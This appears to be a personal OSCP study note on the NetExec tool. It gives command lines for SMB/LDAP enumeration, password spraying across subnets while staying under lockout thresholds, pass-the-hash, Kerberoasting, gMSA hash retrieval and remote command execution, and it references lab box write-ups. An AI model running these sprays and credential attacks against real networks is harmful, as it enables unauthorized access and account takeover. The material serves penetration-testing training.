# NetExec (nxc)

The actively-maintained successor to CrackMapExec (now inactive). A single tool for authenticating against and enumerating SMB/WinRM/MSSQL/LDAP/RDP/SSH/VNC/FTP across one host or an entire subnet at once.

---

## What it replaces, and why it's faster

[[06. Information Gathering#6.4.4. SMB Enumeration|6.4.4]] teaches `enum4linux`, `nbtscan`, and `smbclient -L` one host at a time, each tool doing one narrow job. NetExec rolls host OS/version fingerprinting, share enumeration, null-session checking, and (once you have creds) command execution into one consistent syntax that also just works against a whole subnet instead of a single IP, genuinely useful once a network has more than one box worth checking, not just a one-host convenience.

## Install

```bash
sudo apt install netexec
```

## Usage

```bash
# Unauthenticated fingerprint + null-session check, single host or a whole subnet
netexec smb <target>
netexec smb 192.168.1.0/24

# Enumerate shares once you have creds
netexec smb <target> -u <user> -p <pass> --shares

# Blank/anonymous creds explicitly
netexec smb <target> -u '' -p ''

# Execute a command once you have admin-equivalent creds (needs valid admin access, this isn't a vuln-finder)
netexec smb <target> -u <user> -p <pass> -x 'whoami'
```
*Same underlying auth mechanics as `smbclient`/`enum4linux`, NetExec is a convenience/consistency wrapper, not a different attack. Genuinely useful once you're spraying the same creds across many hosts, which manual `smbclient` doesn't do at all.*

## Password Spraying & Credential Verification

NetExec is the standard tool for spraying one credential across an entire subnet -- something Hydra (single-host) and manual `smbclient` (no subnet mode) can't do:

```bash
# Spray a domain credential across a subnet (one password, all hosts)
netexec smb 192.168.1.0/24 -u <user> -p <password>

# Spray a LOCAL account credential (--local-auth bypasses domain authentication)
netexec smb 192.168.1.0/24 -u Administrator -p <password> --local-auth

# Verify a credential without running a command (just check if it authenticates)
netexec smb <target> -u <user> -p <password>
# [+] = authenticated successfully; [-] = failed; (Pwn3d!) = local admin confirmed

# Pass-the-hash spray (NTLM hash instead of plaintext)
netexec smb 192.168.1.0/24 -u Administrator -H <NThash> --local-auth
```

**Reading the output:**
- `[+] host (STATUS)` with no `(Pwn3d!)` → credentials are valid but no local admin
- `[+] host (Pwn3d!)` → local admin on this host -- target for psexec/wmiexec lateral movement
- `[-] STATUS_LOGON_FAILURE` (fast) → wrong password
- Response hangs then fails → password correct but post-auth sessions blocked (lab infrastructure issue -- try non-interactive paths like schtasks)

**The credential-differentiation tell:**
Wrong password fails INSTANTLY with `STATUS_LOGON_FAILURE`. A correct password that hangs afterward still confirms the credential is right. If `STATUS_LOGON_FAILURE` appears fast, change the password. If it hangs, something else is blocking post-auth sessions. See [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2 hard-won lesson]].

> 🔍 **Worth remembering generally:** spray ONE password at a time per account. Sending a list of passwords per account is just a dictionary attack, which triggers lockout policies. The spray pattern (one password, many accounts) is specifically designed to stay under the lockout threshold.

🔁 [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2]], [[16. Password Attacks#16.1.2. RDP|16.1.2]]

## Where this applies in the vault

- [[06. Information Gathering#6.4.4. SMB Enumeration|6.4.4, SMB Enumeration]], as a faster/broader alternative to `enum4linux`/`nbtscan` for the same recon goal
- [[Windows Methodology#Step 2: SMB Enumeration|Windows Methodology, Step 2]]
- Already used ad hoc in the Active box writeup for credential verification, this entry formalizes it as a general recon-speed tool rather than a one-off
- [[OSCP/BOXES/WRITE UPS/AD/Fermion|Fermion]] -- used for SMB share discovery, WinRM validation, one-shot command execution, and Administrator pass-the-hash
- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] -- validated Kerberos ccaches over SMB and exposed the NTLM-disabled/WinRM-client limitation

### Kerberos cache validation

When NTLM is disabled, use the target FQDN and an existing ccache:

```bash
KRB5_CONFIG=$BoxDir/notes/krb5.conf \
KRB5CCNAME=$BoxDir/loot/$Username.ccache \
  nxc smb $FQDN -d $Domain -k --use-kcache --kdcHost $BoxIP
```

`[+] ... from ccache` proves that the ticket is accepted. A failed `nxc winrm` attempt can still be a module limitation; Vintage used Kerberos-aware Evil-WinRM and Impacket WMI instead of treating that failure as bad credentials.

#### Tags: #ModernTooling #NetExec #CrackMapExec #SMB #ActiveDirectory
## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

NetExec supports a repeatable task in an authorized assessment; knowing when to use it keeps the workflow deliberate rather than tool-led.

## Tool description

NetExec is a focused utility for the technique named by this page. Read its output as evidence and confirm important findings manually.

## Basic usage

Run the help screen first, then use the smallest command that answers the current question:

~~~bash
netexec --help
~~~

## Related RUNBOOK V2 stage

- [[OSCP/RUNBOOK V2/Index]] -- route to the technique-specific stage after identifying the finding

## Related module

- [[OSCP/MODULES/13. Locating Public Exploits]] -- understand the tool’s place in a controlled workflow

## Search: end-to-end AD use

Search used NetExec for null-session observation, LDAP/SMB credential validation, share enumeration, a one-password spray, Kerberoasting, gMSA retrieval, NT-hash authentication, and final WMI command execution.

~~~bash
netexec smb $BoxIP
netexec smb $BoxIP -u '' -p '' --shares
netexec ldap $BoxIP -u $Username -p $Password --kerberoasting $BoxDir/loot/kerberoast.txt
netexec smb $BoxIP -u $BoxDir/loot/usernames.txt -p $Password2 --continue-on-success
netexec ldap $BoxIP -u $Username4 -p $Password4 --gmsa
netexec smb $BoxIP -u 'BIR-ADFS-GMSA$' -H $GmsaHash
netexec smb $BoxIP -u Tristan.Davies -p $Password3 -x 'type C:\Users\Administrator\Desktop\root.txt'
~~~

[+] proves authentication; Pwn3d! proves local administrator access. A successful authentication without Pwn3d! is still useful for share or LDAP enumeration. Full evidence: [[OSCP/BOXES/WRITE UPS/AD/Search|Search]].
